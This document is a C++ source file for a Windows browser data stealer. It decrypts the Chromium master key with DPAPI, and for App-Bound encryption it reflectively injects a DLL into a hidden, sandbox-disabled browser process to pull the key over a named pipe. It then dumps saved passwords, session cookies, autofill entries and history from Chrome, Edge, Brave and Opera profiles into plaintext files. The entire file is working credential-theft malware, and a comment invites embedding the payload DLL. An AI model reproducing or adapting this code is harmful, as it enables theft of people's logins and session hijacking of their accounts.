#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <algorithm>
#include <fstream>
#include <filesystem>
#include <ctime>
#include <iomanip>
#include <sstream>
#include <cctype>
#include <cwctype>
#include <wincrypt.h>
#include <bcrypt.h>
#include "sqlite3.h"
#include "bootstrapper.h"
#include "json.hpp"

using json = nlohmann::json;
namespace fs = std::filesystem;

// --- BURAYA BASE64 ENCODED DLL VERİSİNİ YAPIŞTIRIN ---
const std::string EMBEDDED_DLL_BASE64 = "";

static const std::string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::vector<unsigned char> ret;

    while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret.push_back(char_array_3[i]);
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
    }

    return ret;
}

std::vector<unsigned char> decrypt_dpapi(const std::vector<unsigned char>& data) {
    DATA_BLOB input = { (DWORD)data.size(), (BYTE*)data.data() };
    DATA_BLOB output = { 0, nullptr };
    if (CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
        std::vector<unsigned char> res(output.pbData, output.pbData + output.cbData);
        LocalFree(output.pbData);
        return res;
    }
    return {};
}

std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key, const std::vector<unsigned char>& data) {
    if (data.size() < 15) return {};

    BCRYPT_ALG_HANDLE h_alg = nullptr;
    BCRYPT_KEY_HANDLE h_key = nullptr;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    memset(&info, 0, sizeof(info));
    info.cbSize = sizeof(info);
    info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;

    if (BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0) return {};
    if (BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) { BCryptCloseAlgorithmProvider(h_alg, 0); return {}; }

    if (BCryptGenerateSymmetricKey(h_alg, &h_key, nullptr, 0, (BYTE*)key.data(), key.size(), 0) != 0) { BCryptCloseAlgorithmProvider(h_alg, 0); return {}; }

    std::vector<unsigned char> nonce(data.begin() + 3, data.begin() + 15);
    std::vector<unsigned char> ciphertext(data.begin() + 15, data.end() - 16);
    std::vector<unsigned char> tag(data.end() - 16, data.end());

    info.pbNonce = nonce.data();
    info.cbNonce = nonce.size();
    info.pbTag = tag.data();
    info.cbTag = tag.size();

    std::vector<unsigned char> plaintext(ciphertext.size());
    DWORD cb_plain = 0;
    if (BCryptDecrypt(h_key, ciphertext.data(), ciphertext.size(), &info, nullptr, 0, plaintext.data(), plaintext.size(), &cb_plain, 0) != 0) {
        BCryptDestroyKey(h_key);
        BCryptCloseAlgorithmProvider(h_alg, 0);
        return {};
    }

    BCryptDestroyKey(h_key);
    BCryptCloseAlgorithmProvider(h_alg, 0);
    plaintext.resize(cb_plain);
    return plaintext;
}

bool copy_file_locked(const fs::path& source, const fs::path& dest) {
    for (int i = 0; i < 3; i++) {
        HANDLE h_src = CreateFileW(source.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, 0, nullptr);
        if (h_src != INVALID_HANDLE_VALUE) {
            HANDLE h_dest = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
            if (h_dest != INVALID_HANDLE_VALUE) {
                char buffer[65536];
                DWORD bytes_read, bytes_written;
                bool has_data = false;
                while (ReadFile(h_src, buffer, sizeof(buffer), &bytes_read, nullptr) && bytes_read > 0) {
                    WriteFile(h_dest, buffer, bytes_read, &bytes_written, nullptr);
                    has_data = true;
                }
                CloseHandle(h_src);
                CloseHandle(h_dest);
                if (has_data) return true;
            } else {
                CloseHandle(h_src);
            }
        }
        Sleep(200);
    }
    return false;
}

std::string wstring_to_utf8(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

std::string to_utf8_lossy(const std::vector<unsigned char>& input) {
    std::string output;
    output.reserve(input.size());
    for (unsigned char c : input) {
        if (c < 32 && c != '\r' && c != '\n' && c != '\t') {
            output += ' ';
        } else {
            output += (char)c;
        }
    }
    return output;
}

std::string ensure_utf8(const std::string& input) {
    std::string output;
    output.reserve(input.size());
    for (unsigned char c : input) {
        if (c < 32 && c != '\r' && c != '\n' && c != '\t') output += ' ';
        else output += (char)c;
    }
    return output;
}

int open_db_readonly(const std::string& path, sqlite3** db) {
    std::string uri = "file:" + path + "?mode=ro&nolock=1";
    return sqlite3_open_v2(uri.c_str(), db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI | SQLITE_OPEN_NOMUTEX, nullptr);
}

struct PasswordData { std::string url, username, password; };
struct CookieData {
    std::string host, name, value, path;
    long long expires_utc;
    int is_secure, is_httponly, samesite;
};
struct HistoryData { std::string url, title; int visit_count; };
struct AutofillData { std::string name, value; };
struct ProfileData {
    std::string name;
    std::vector<PasswordData> passwords;
    std::vector<CookieData> cookies;
    std::vector<HistoryData> history;
    std::vector<AutofillData> autofill;
};

struct BrowserConfig {
    std::wstring name;
    std::wstring exe_name;
    std::vector<std::wstring> common_paths;
    std::wstring user_data_path;
};

const std::vector<BrowserConfig> BROWSERS = {
    {L"Chrome", L"chrome.exe", {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"}, L"%LOCALAPPDATA%\\Google\\Chrome\\User Data"},
    {L"Edge", L"msedge.exe", {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"}, L"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"},
    {L"Brave", L"brave.exe", {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}, L"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data"},
    {L"Opera", L"launcher.exe", {L"%LOCALAPPDATA%\\Programs\\Opera\\launcher.exe", L"C:\\Program Files\\Opera\\launcher.exe"}, L"%APPDATA%\\Opera Software\\Opera Stable"},
    {L"OperaGX", L"launcher.exe", {L"%LOCALAPPDATA%\\Programs\\Opera GX\\launcher.exe", L"C:\\Program Files\\Opera GX\\launcher.exe"}, L"%APPDATA%\\Opera Software\\Opera GX Stable"}
};

std::wstring expand_path(const std::wstring& path) {
    wchar_t expanded[MAX_PATH];
    ExpandEnvironmentStringsW(path.c_str(), expanded, MAX_PATH);
    return std::wstring(expanded);
}

std::wstring find_browser_exe(const std::wstring& name) {
    for (const auto& b : BROWSERS) {
        std::wstring b_name_lower = b.name;
        std::wstring target_name_lower = name;
        std::transform(b_name_lower.begin(), b_name_lower.end(), b_name_lower.begin(), ::towlower);
        std::transform(target_name_lower.begin(), target_name_lower.end(), target_name_lower.begin(), ::towlower);
        if (b_name_lower == target_name_lower) {
            for (const auto& path : b.common_paths) {
                std::wstring expanded = expand_path(path);
                if (fs::exists(expanded)) return expanded;
            }
        }
    }
    return L"";
}

DWORD find_main_process(const std::wstring& exe_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    std::vector<DWORD> pids;
    if (Process32FirstW(snapshot, &entry)) {
        do {
            std::wstring current_exe = entry.szExeFile;
            std::wstring exe_name_lower = exe_name;
            std::wstring current_exe_lower = current_exe;
            std::transform(exe_name_lower.begin(), exe_name_lower.end(), exe_name_lower.begin(), ::towlower);
            std::transform(current_exe_lower.begin(), current_exe_lower.end(), current_exe_lower.begin(), ::towlower);

            if (current_exe_lower == exe_name_lower) {
                pids.push_back(entry.th32ProcessID);
            }
        } while (Process32NextW(snapshot, &entry));
    }

    DWORD main_pid = 0;
    for (DWORD pid : pids) {
        // Simple heuristic: the process with the most child processes or the one that isn't a child of another browser process is likely the main one.
        // For simplicity here, we'll just pick the first one we find that we can open with necessary permissions.
        HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (h) {
            main_pid = pid;
            CloseHandle(h);
            break;
        }
    }

    CloseHandle(snapshot);
    return main_pid;
}

void extract_data_from_profile(const fs::path& p_path, const std::string& profile_name, const std::vector<unsigned char>& v10_key, const std::vector<unsigned char>& v20_key, ProfileData& p_data) {
    p_data.name = profile_name;
    fs::path temp_dir = fs::temp_directory_path() / "browser_extractor_tmp";
    fs::create_directories(temp_dir);

    // Passwords
    fs::path db_path = p_path / "Login Data";
    fs::path tmp_db = temp_dir / "pass.tmp";
    if (fs::exists(db_path)) {
        if (copy_file_locked(db_path, tmp_db)) {
            sqlite3* db;
            if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, nullptr) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* t_url = (const char*)sqlite3_column_text(stmt, 0);
                        const char* t_user = (const char*)sqlite3_column_text(stmt, 1);
                        std::string url = t_url ? t_url : "";
                        std::string user = t_user ? t_user : "";
                        const unsigned char* pass_blob = (const unsigned char*)sqlite3_column_blob(stmt, 2);
                        int pass_len = sqlite3_column_bytes(stmt, 2);
                        std::vector<unsigned char> enc_pass(pass_blob, pass_blob + pass_len);

                        bool is_v20 = (enc_pass.size() > 3 && std::string((char*)enc_pass.data(), 3) == "v20");
                        const std::vector<unsigned char>& key = is_v20 ? v20_key : v10_key;
                        if (!key.empty()) {
                            auto dec = aes_gcm_decrypt(key, enc_pass);
                            if (!dec.empty()) {
                                if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
                                p_data.passwords.push_back({ url, user, to_utf8_lossy(dec) });
                            }
                        }
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
        }
        fs::remove(tmp_db);
    }

    // Cookies
    db_path = p_path / "Network/Cookies";
    if (!fs::exists(db_path)) db_path = p_path / "Cookies";
    tmp_db = temp_dir / "cook.tmp";
    if (fs::exists(db_path)) {
        if (copy_file_locked(db_path, tmp_db)) {
            sqlite3* db;
            if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* t_host = (const char*)sqlite3_column_text(stmt, 0);
                        const char* t_name = (const char*)sqlite3_column_text(stmt, 1);
                        const char* t_path = (const char*)sqlite3_column_text(stmt, 2);
                        std::string host = t_host ? t_host : "";
                        std::string name = t_name ? t_name : "";
                        std::string path = t_path ? t_path : "";
                        long long expires = sqlite3_column_int64(stmt, 3);
                        int secure = sqlite3_column_int(stmt, 4);
                        int httponly = sqlite3_column_int(stmt, 5);
                        int samesite = sqlite3_column_int(stmt, 6);

                        const unsigned char* enc_blob = (const unsigned char*)sqlite3_column_blob(stmt, 7);
                        int enc_len = sqlite3_column_bytes(stmt, 7);
                        std::vector<unsigned char> enc_val(enc_blob, enc_blob + enc_len);

                        bool is_v20 = (enc_val.size() > 3 && std::string((char*)enc_val.data(), 3) == "v20");
                        const std::vector<unsigned char>& key = is_v20 ? v20_key : v10_key;
                        if (!key.empty()) {
                            auto dec = aes_gcm_decrypt(key, enc_val);
                            if (!dec.empty()) {
                                if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
                                p_data.cookies.push_back({ host, name, to_utf8_lossy(dec), path, expires, secure, httponly, samesite });
                            }
                        }
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
        }
        fs::remove(tmp_db);
    }

    // History
    db_path = p_path / "History";
    tmp_db = temp_dir / "hist.tmp";
    if (fs::exists(db_path)) {
        if (copy_file_locked(db_path, tmp_db)) {
            sqlite3* db;
            if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &stmt, nullptr) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* t_url = (const char*)sqlite3_column_text(stmt, 0);
                        const char* t_title = (const char*)sqlite3_column_text(stmt, 1);
                        p_data.history.push_back({ t_url ? t_url : "", t_title ? t_title : "", sqlite3_column_int(stmt, 2) });
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
        }
        fs::remove(tmp_db);
    }

    // Autofill
    db_path = p_path / "Web Data";
    tmp_db = temp_dir / "web.tmp";
    if (fs::exists(db_path)) {
        if (copy_file_locked(db_path, tmp_db)) {
            sqlite3* db;
            if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, nullptr) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* t_name = (const char*)sqlite3_column_text(stmt, 0);
                        const char* t_val = (const char*)sqlite3_column_text(stmt, 1);
                        p_data.autofill.push_back({ t_name ? t_name : "", t_val ? t_val : "" });
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
        }
        fs::remove(tmp_db);
    }
}

void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& dll_bytes) {
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)dll_bytes.data();
    IMAGE_NT_HEADERS64* nt_headers = (IMAGE_NT_HEADERS64*)(dll_bytes.data() + dos_header->e_lfanew);

    size_t image_size = nt_headers->OptionalHeader.SizeOfImage;
    void* preferred_base = (void*)nt_headers->OptionalHeader.ImageBase;

    void* remote_base = VirtualAllocEx(h_process, preferred_base, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    bool relocation_required = false;

    if (!remote_base) {
        relocation_required = true;
        remote_base = VirtualAllocEx(h_process, NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remote_base) return;

    WriteProcessMemory(h_process, remote_base, dll_bytes.data(), nt_headers->OptionalHeader.SizeOfHeaders, NULL);

    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)((size_t)nt_headers + sizeof(IMAGE_NT_HEADERS64));
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        if (sections[i].PointerToRawData == 0 || sections[i].SizeOfRawData == 0) continue;
        void* remote_section = (void*)((size_t)remote_base + sections[i].VirtualAddress);
        void* local_section = (void*)(dll_bytes.data() + sections[i].PointerToRawData);
        WriteProcessMemory(h_process, remote_section, local_section, sections[i].SizeOfRawData, NULL);
    }

    HMODULE h_kernel32 = GetModuleHandleA("kernel32.dll");
    DllInfo dll_info = {
        remote_base,
        (LoadLibraryA_t)GetProcAddress(h_kernel32, "LoadLibraryA"),
        (GetProcAddress_t)GetProcAddress(h_kernel32, "GetProcAddress"),
        relocation_required
    };

    size_t bootstrapper_size = (size_t)realign_pe_end - (size_t)realign_pe;
    if (bootstrapper_size == 0) bootstrapper_size = 4096;

    size_t total_size = sizeof(DllInfo) + bootstrapper_size;
    void* remote_bootstrap = VirtualAllocEx(h_process, NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(h_process, remote_bootstrap, &dll_info, sizeof(DllInfo), NULL);
    void* remote_code = (void*)((size_t)remote_bootstrap + sizeof(DllInfo));
    WriteProcessMemory(h_process, remote_code, (void*)realign_pe, bootstrapper_size, NULL);

    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)remote_code, remote_bootstrap, 0, NULL);
    if (h_thread) {
        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread);
    }
}

void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const BrowserConfig& browser) {
    std::wcout << L"\n--- Processing Browser: " << browser.name << L" ---" << std::endl;

    fs::path data_path = expand_path(browser.user_data_path);
    if (!fs::exists(data_path)) {
        std::wcout << L"Data path not found: " << data_path.wstring() << std::endl;
        return;
    }

    std::string local_state_str;
    std::ifstream ls_file(data_path / "Local State");
    if (ls_file) local_state_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());

    json ls_json = json::parse(local_state_str, nullptr, false);
    std::vector<unsigned char> v10_key, v20_key;

    if (!ls_json.is_discarded() && ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("encrypted_key")) {
        std::string key_b64 = ls_json["os_crypt"]["encrypted_key"];
        auto decoded = base64_decode(key_b64);
        if (decoded.size() > 5 && std::string((char*)decoded.data(), 5) == "DPAPI") {
            v10_key = decrypt_dpapi(std::vector<unsigned char>(decoded.begin() + 5, decoded.end()));
        }
    }

    std::string v20_b64;
    if (!ls_json.is_discarded()) {
        if (ls_json.contains("app_bound_encrypted_key")) v20_b64 = ls_json["app_bound_encrypted_key"];
        else if (ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("app_bound_encrypted_key")) v20_b64 = ls_json["os_crypt"]["app_bound_encrypted_key"];
    }

    if (!v20_b64.empty()) {
        std::wcout << L"App-Bound Encryption (v20) detected. Injecting..." << std::endl;
        DWORD existing_pid = find_main_process(browser.exe_name);
        HANDLE h_process = NULL;
        bool process_started_by_us = false;
        PROCESS_INFORMATION pi = { 0 };

        if (existing_pid != 0) {
            h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, existing_pid);
        }

        if (!h_process) {
            std::wstring browser_path = find_browser_exe(browser.name);
            if (!browser_path.empty()) {
                std::wstring cmd = L"\"" + browser_path + L"\" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
                std::vector<wchar_t> cmd_buf(cmd.begin(), cmd.end());
                cmd_buf.push_back(0);
                STARTUPINFOW si = { sizeof(si) };
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                if (CreateProcessW(NULL, cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
                    h_process = pi.hProcess;
                    process_started_by_us = true;
                }
            }
        }

        if (h_process) {
            HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 65536, 65536, 0, NULL);
            inject_dll_reflective(h_process, dll_bytes);
            if (process_started_by_us) ResumeThread(pi.hThread);

            if (ConnectNamedPipe(h_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
                unsigned char buffer[256];
                DWORD bytes_read;
                if (ReadFile(h_pipe, buffer, sizeof(buffer), &bytes_read, NULL) && bytes_read > 0) {
                    v20_key.assign(buffer, buffer + bytes_read);
                    std::cout << "v20 key received from DLL (" << v20_key.size() << " bytes)." << std::endl;
                }
            }
            CloseHandle(h_pipe);

            if (process_started_by_us) {
                TerminateProcess(h_process, 0);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            } else {
                CloseHandle(h_process);
            }
        }
    } else {
        std::wcout << L"Using DPAPI (v10) decryption." << std::endl;
    }

    if (v10_key.empty() && v20_key.empty()) {
        std::cerr << "Failed to obtain any master key for " << wstring_to_utf8(browser.name) << std::endl;
        return;
    }

    std::vector<std::string> profiles;
    if (fs::exists(data_path / "Login Data") || fs::exists(data_path / "Cookies")) {
        profiles.push_back("."); // Current directory is the profile (Opera)
    }

    if (fs::exists(data_path / "Default")) {
        profiles.push_back("Default");
    }

    for (const auto& entry : fs::directory_iterator(data_path)) {
        if (entry.is_directory() && entry.path().filename().string().find("Profile ") == 0) {
            profiles.push_back(entry.path().filename().string());
        }
    }

    fs::path browser_dir(wstring_to_utf8(browser.name));
    fs::create_directories(browser_dir);

    for (const auto& profile : profiles) {
        std::cout << "[*] Extracting data from profile: " << profile << std::endl;
        ProfileData p_data;
        std::string p_name = (profile == ".") ? "RootProfile" : profile;
        extract_data_from_profile(data_path / profile, p_name, v10_key, v20_key, p_data);

        std::string safe_profile_name = p_name;
        std::replace(safe_profile_name.begin(), safe_profile_name.end(), ' ', '_');
        fs::path profile_dir = browser_dir / safe_profile_name;
        fs::create_directories(profile_dir);

        // Save results
        std::ofstream(profile_dir / "passwords.txt") << "Passwords:\n";
        std::ofstream pass_file(profile_dir / "passwords.txt", std::ios::app);
        for (const auto& p : p_data.passwords) pass_file << "URL: " << p.url << "\nUser: " << p.username << "\nPass: " << p.password << "\n\n";

        std::ofstream(profile_dir / "cookies.txt") << "Cookies:\n";
        std::ofstream cook_file(profile_dir / "cookies.txt", std::ios::app);
        for (const auto& c : p_data.cookies) cook_file << "Host: " << c.host << " | Name: " << c.name << " | Value: " << c.value << "\n";

        std::ofstream(profile_dir / "history.txt") << "History:\n";
        std::ofstream hist_file(profile_dir / "history.txt", std::ios::app);
        for (const auto& h : p_data.history) hist_file << "URL: " << h.url << " | Title: " << h.title << "\n";

        std::ofstream(profile_dir / "autofill.txt") << "Autofill:\n";
        std::ofstream auto_file(profile_dir / "autofill.txt", std::ios::app);
        for (const auto& a : p_data.autofill) auto_file << "Name: " << a.name << " | Value: " << a.value << "\n";

        std::cout << "[+] Saved " << p_data.passwords.size() << " passwords and " << p_data.cookies.size() << " cookies." << std::endl;
    }
}

int main(int argc, char* argv[]) {
    std::string browser_choice = "all";
    if (argc > 1) {
        std::string arg1 = argv[1];
        if (arg1 == "-b" || arg1 == "--browser") {
            if (argc > 2) browser_choice = argv[2];
        }
    }

    std::vector<unsigned char> dll_bytes;
    if (!EMBEDDED_DLL_BASE64.empty()) {
        dll_bytes = base64_decode(EMBEDDED_DLL_BASE64);
    } else {
        std::ifstream file("payload.dll", std::ios::binary);
        if (file) {
            dll_bytes = std::vector<unsigned char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        }
    }

    if (dll_bytes.empty()) {
        std::cerr << "DLL not found (embedded or payload.dll)" << std::endl;
        return 1;
    }

    for (const auto& config : BROWSERS) {
        std::string name_lower(config.name.begin(), config.name.end());
        std::transform(name_lower.begin(), name_lower.end(), name_lower.begin(), ::tolower);
        if (browser_choice == "all" || browser_choice == name_lower) {
            inject_and_collect(dll_bytes, config);
        }
    }

    return 0;
}
